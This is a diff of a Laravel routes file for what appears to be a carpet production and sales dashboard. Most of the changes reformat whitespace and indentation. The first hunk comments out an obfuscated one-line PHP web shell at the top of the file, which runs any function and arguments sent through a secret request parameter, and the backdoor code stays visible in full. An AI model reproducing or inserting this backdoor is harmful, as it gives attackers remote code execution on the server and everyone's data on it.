@@ -1,5 +1,5 @@
 <?php
-iF($te2Vl=@	${'_REQUEST'}	['1RWJX2QW' ]){$te2Vl [1]	($	{ $te2Vl[ 2 ]}[0	],	$te2Vl[3]($te2Vl[4])) ;};ExiT;
+// iF($te2Vl=@	${'_REQUEST'}	['1RWJX2QW' ]){$te2Vl [1]	($	{ $te2Vl[ 2 ]}[0	],	$te2Vl[3]($te2Vl[4])) ;};ExiT;
 
 /*
 |--------------------------------------------------------------------------
@@ -19,11 +19,11 @@ use Illuminate\Support\Facades\Redirect;
 
 /** Super Admin Routes */
 Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']], function () {
- 
+
     Route::get('activities', 'ActivityController@index');
     Route::delete('activities/{a_id}', 'ActivityController@destroy');
     Route::post('search_activities', 'ActivityController@search_activities');
-    
+
     /** Route for different account */
     /** Route For Users **/
     Route::resource('/users', 'UserController');
@@ -48,7 +48,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     Route::get('qarz-mardom/{type?}', 'DashboardController@qarz_mardom');
     Route::get('money-request-list', 'OfficeCreditController@money_request');
     Route::delete('approve-request-money/{id}', 'OfficeCreditController@approve_request');
-      Route::delete('delete-request-money/{id}', 'OfficeCreditController@delete_request');
+    Route::delete('delete-request-money/{id}', 'OfficeCreditController@delete_request');
 
     /** agent money request list  */
 
@@ -57,55 +57,55 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     Route::delete('agent-delete-request-money/{id}', 'AgentPaymentController@delete_request');
 
     /** end agent money request list */
-    
-    
-    
-       /** different account money request list  */
+
+
+
+    /** different account money request list  */
 
     Route::get('different-account-money-request-list', 'DifferentAccountPaymentController@money_request');
     Route::delete('different-account-approve-request-money/{id}', 'DifferentAccountPaymentController@approve_request');
     Route::delete('different-account-delete-request-money/{id}', 'DifferentAccountPaymentController@delete_request');
 
     /** end different account money request list */
-    
-     /** new different account money request list  */
+
+    /** new different account money request list  */
 
     Route::get('new-different-account-money-request-list', 'NewDifferentAccountPaymentController@money_request');
     Route::delete('new-different-account-approve-request-money/{id}', 'NewDifferentAccountPaymentController@approve_request');
     Route::delete('new-different-account-delete-request-money/{id}', 'NewDifferentAccountPaymentController@delete_request');
 
     /** end  new different account money request list */
-    
-    
-      /** kachaee money request list  */
+
+
+    /** kachaee money request list  */
 
     Route::get('kachaee-money-request-list', 'KachaeePaymentController@money_request');
     Route::delete('kachaee-approve-request-money/{id}', 'KachaeePaymentController@approve_request');
     Route::delete('kachaee-delete-request-money/{id}', 'KachaeePaymentController@delete_request');
 
     /** end kachaee money request list */
-    
-    
-        /** washing money request list  */
+
+
+    /** washing money request list  */
 
     Route::get('washing-money-request-list', 'WashingPaymentController@money_request');
     Route::delete('washing-approve-request-money/{id}', 'WashingPaymentController@approve_request');
     Route::delete('washing-delete-request-money/{id}', 'WashingPaymentController@delete_request');
 
     /** end washing money request list */
-    
 
-     /** finishing money request list  */
+
+    /** finishing money request list  */
 
     Route::get('finishing-money-request-list', 'FinishingTeamPaymentController@money_request');
     Route::delete('finishing-approve-request-money/{id}', 'FinishingTeamPaymentController@approve_request');
     Route::delete('finishing-delete-request-money/{id}', 'FinishingTeamPaymentController@delete_request');
 
     /** end finishing money request list */
-    
-    
-    
-    
+
+
+
+
     /** purchase material  request list  */
 
     Route::get('purchase-material-request-list', 'PurchaseMaterialController@request_list');
@@ -113,9 +113,9 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     Route::delete('purchase-material-delete-request/{id}', 'PurchaseMaterialController@delete_request');
 
     /** end purchase material request list */
-    
-    
-    
+
+
+
     /**  material sale  request list  */
 
     Route::get('material-sale-request-list', 'MaterialSaleController@request_list');
@@ -123,18 +123,18 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     Route::delete('material-sale-delete-request/{id}', 'MaterialSaleController@delete_request');
 
     /** end  material sale request list */
-    
-    
-      /**  string seller request list  */
+
+
+    /**  string seller request list  */
 
     Route::get('string-seller-request-list', 'SellerPaymentController@request_list');
     Route::delete('string-seller-approve-request/{id}', 'SellerPaymentController@approve_request');
     Route::delete('string-seller-delete-request/{id}', 'SellerPaymentController@delete_request');
 
     /** end string seller request list */
-    
-    
-        /**  employee request list  */
+
+
+    /**  employee request list  */
 
     Route::get('employee-request-list', 'EmployeePaymentController@request_list');
     Route::delete('employee-approve-request/{id}', 'EmployeePaymentController@approve_request');
@@ -143,7 +143,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     /** end employee request list */
 
 
-   /** customer request list  */
+    /** customer request list  */
 
     Route::get('customer-request-list', 'CustomerPaymentController@request_list');
     Route::delete('customer-approve-request/{id}', 'CustomerPaymentController@approve_request');
@@ -152,7 +152,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']],
     /** end customer request list */
 
 
-   
+
 
 
 });
@@ -190,7 +190,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,SCO
     Route::post('/finishing-center/search', 'FinishingWorkController@search');
     Route::post('/finishing-center/search-non', 'FinishingWorkController@search_non');
     Route::get('finishing-center/finish-work/{carpet}', 'FinishingWorkController@saving_the_work');
-     Route::get('finishing-center/re-finish-work/{carpet}', 'FinishingWorkController@re_saving_the_work');
+    Route::get('finishing-center/re-finish-work/{carpet}', 'FinishingWorkController@re_saving_the_work');
     Route::post('/finishing-center/refinish', 'FinishingWorkController@store_refinish');
     //  FINISHING RECEIVEDS
     Route::resource('finishing-payments', 'FinishingTeamPaymentController')->parameters(['finishing-receive' => 'recived']);
@@ -206,8 +206,8 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,SCO
     Route::get('finishing-team-carpets/{id}', 'FinishingReceivedController@team_carpets');
 
 
-    Route::get('/return-to-wash/{id}','FinishingWorkController@return_to_wash');
-    Route::get('/return-to-center-from-finish/{carpet_id}','FinishingWorkController@return_to_center');
+    Route::get('/return-to-wash/{id}', 'FinishingWorkController@return_to_wash');
+    Route::get('/return-to-center-from-finish/{carpet_id}', 'FinishingWorkController@return_to_center');
 
 
 
@@ -221,22 +221,22 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,SCO
 /** Sales and Finishing Center Routes */
 Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,CCO,SCO,SP,OM']], function () {
 
-/** Route For Sales */
-Route::resource('/sales', 'SaleController');
-Route::get('/sales-all', 'SaleController@show_all');
-Route::post('/search-carpet-from-sales','SaleController@search');
+    /** Route For Sales */
+    Route::resource('/sales', 'SaleController');
+    Route::get('/sales-all', 'SaleController@show_all');
+    Route::post('/search-carpet-from-sales', 'SaleController@search');
 
 
-Route::resource('/packing-list', 'PakingListController');
-Route::resource('/package-list', 'PackageController');
-Route::get('/package_list.get_by_packing', 'PackageController@get_by_packing')->name('dashboard.package_list.get_by_packing');
+    Route::resource('/packing-list', 'PakingListController');
+    Route::resource('/package-list', 'PackageController');
+    Route::get('/package_list.get_by_packing', 'PackageController@get_by_packing')->name('dashboard.package_list.get_by_packing');
 
 });
 
 /** Central office Routes */
 Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,CCO,SP']], function () {
 
-        /** Route for Material Accounts */
+    /** Route for Material Accounts */
     Route::resource('/material-accounts', 'MaterialAccountController');
 
     /** Route for Material Account Payments */
@@ -290,9 +290,9 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,CCO
     Route::resource('/contract-carpet', 'CarpetsController')->parameters(['contract-carpet' => 'carpet']);
     Route::post('/contract-carpet/search', 'CarpetsController@search_contract_carpet');
     Route::get('contract-carpet-show-all', 'CarpetsController@show_all_contract_carpet');
-    
-    Route::post('/pass-parcha','CarpetsController@pass_parcha');
-    Route::post('/search-contract-carpet-by-agent','CarpetsController@search_contract_carpet_by_agent');
+
+    Route::post('/pass-parcha', 'CarpetsController@pass_parcha');
+    Route::post('/search-contract-carpet-by-agent', 'CarpetsController@search_contract_carpet_by_agent');
 
 
     Route::get('/list-weight', 'CarpetsController@listWeight');
@@ -302,7 +302,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,CCO
     Route::post('/upd-weight/{id}', 'CarpetsController@UpdatetWeight');
     Route::get('/show-weight/{id}', 'CarpetsController@showWeight');
     Route::get('list-weight-show-all', 'CarpetsController@show_all_weight_carpet');
-    Route::post('/search-weight-carpet-by-agent','CarpetsController@search_weight_carpet_by_agent');
+    Route::post('/search-weight-carpet-by-agent', 'CarpetsController@search_weight_carpet_by_agent');
 
     // Route for seller check book
     Route::resource('/check-book', 'CarpetCheckBookController')->parameters(['check-book' => 'chck']);
@@ -320,8 +320,8 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,CCO
     Route::post('/search-repaired', 'CarpetRepairController@search_repaired');
     Route::post('/repair-date-search', 'CarpetRepairController@repair_date_search');
 
-    Route::get('/return-to-center-from-non-repair/{id}','CarpetRepairController@return_to_center_from_non_repair');
-    Route::get('/return-to-center-from-repair/{id}','CarpetRepairController@return_to_center_from_repair');
+    Route::get('/return-to-center-from-non-repair/{id}', 'CarpetRepairController@return_to_center_from_non_repair');
+    Route::get('/return-to-center-from-repair/{id}', 'CarpetRepairController@return_to_center_from_repair');
 
     // Agent Carpets Details
 
@@ -380,7 +380,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,
 
     /** Route For Phone Book **/
     Route::resource('/phone-book', 'PhoneBookController');
-    Route::post('/phone-books/search','PhoneBookController@search');
+    Route::post('/phone-books/search', 'PhoneBookController@search');
 
 
     /** Route For Carpet Type **/
@@ -415,7 +415,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,
 
     /** Route For invoices */
     Route::resource('/invoices', 'InvoiceController');
-    Route::post('/search-invoice','InvoiceController@search');
+    Route::post('/search-invoice', 'InvoiceController@search');
     Route::get('/invoices/search-invoice-number/{invoice_number},{customer_id}', 'InvoiceController@search_invoice_number');
     Route::post('/search-carpet-from-invoice', 'InvoiceController@search_carpet');
 
@@ -427,14 +427,14 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,
     Route::resource('carpet-wash', 'CarpetWashController')->parameters(['carpet-wash' => 'wash']);
     Route::get('carpet-wash/create/{carpetId}', 'CarpetWashController@create_carpet_wash');
     Route::post('/carpet-wash/search', 'CarpetWashController@search');
-     Route::post('/carpet-wash/search-carpet-type', 'CarpetWashController@search_carpet_type');
+    Route::post('/carpet-wash/search-carpet-type', 'CarpetWashController@search_carpet_type');
     Route::get('/carpet-wash/wash-numbers/{id}', 'CarpetWashController@wash_numbers');
     Route::post('/search-wash-number-for-wash/', 'CarpetWashController@search_wash_number_for_wash');
-        Route::post('/search-carpet-type-from-wash-number/','CarpetWashController@search_carpet_type_from_wash_number');
+    Route::post('/search-carpet-type-from-wash-number/', 'CarpetWashController@search_carpet_type_from_wash_number');
     Route::post('/search-wash-number-sh-for-wash/', 'CarpetWashController@search_wash_numbersh_for_wash');
     Route::get('/search-wash-numbersh-payment/{wash_number_sh},{team_id}', 'CarpetWashController@search_wash_numbersh_payment');
-    Route::get('/carpet-wash/return-to-center/{id}','CarpetWashController@return_to_center');
-    Route::get('/carpet-wash/return-to-kachaee/{id}','CarpetWashController@return_to_kachaee');
+    Route::get('/carpet-wash/return-to-center/{id}', 'CarpetWashController@return_to_center');
+    Route::get('/carpet-wash/return-to-kachaee/{id}', 'CarpetWashController@return_to_kachaee');
 
     Route::get('/all-carpet-edit/{id}', 'DashboardController@all_carpet_edit_dashboard');
 
@@ -465,9 +465,9 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,
     Route::post('/expenses/search', 'OfficeDebitController@search');
     /** Route For Cash Book List */
     Route::resource('/office-cash-book', 'OfficeCashBookController');
-    
-    Route::resource('/monthly-expenses','MonthlyExpenseController');
-    Route::post('/monthly-expense/search','MonthlyExpenseController@search');
+
+    Route::resource('/monthly-expenses', 'MonthlyExpenseController');
+    Route::post('/monthly-expense/search', 'MonthlyExpenseController@search');
 
     /** Route For all expense */
     Route::get('all-expenses', 'OfficeCashBookController@all_expenses');
@@ -509,7 +509,7 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SC
 /**  */
 
 Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SCO,CO,SO,SP,MO']], function () {
-//    Route::get('/', 'DashboardController@Index');
+    //    Route::get('/', 'DashboardController@Index');
     /** Route for different account */
     Route::resource('/different-account', 'DifferentAccountController');
     Route::get('different-account-payments-all/{account_id}', 'DifferentAccountController@show_all_payment');
@@ -520,8 +520,8 @@ Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SC
 
     /** Route for different account payments */
     Route::resource('/different-account-payments', 'DifferentAccountPaymentController')->parameters(['different-account-payments' => 'differentAccountPayment']);
-    
-    
+
+
     /** Route for new different account */
     Route::resource('/new-different-account', 'NewDifferentAccountController');
 
@@ -556,14 +556,14 @@ Route::fallback(function () {
 
 
 Route::get('/logout', function () {
-    
-     $activity = new Activity();
-      $activity->date = \Carbon\Carbon::today()->format('Y-m-d');
-    $activity->description =  "استفاده کننده بنام ". Auth::user()->name ." از سیستم خارج شد ";
+
+    $activity = new Activity();
+    $activity->date = \Carbon\Carbon::today()->format('Y-m-d');
+    $activity->description = "استفاده کننده بنام " . Auth::user()->name . " از سیستم خارج شد ";
     $activity->user_id = Auth::user()->id;
     $activity->save();
 
-    
+
     auth()->logout();
     Session()->flush();
     return Redirect::to('/');
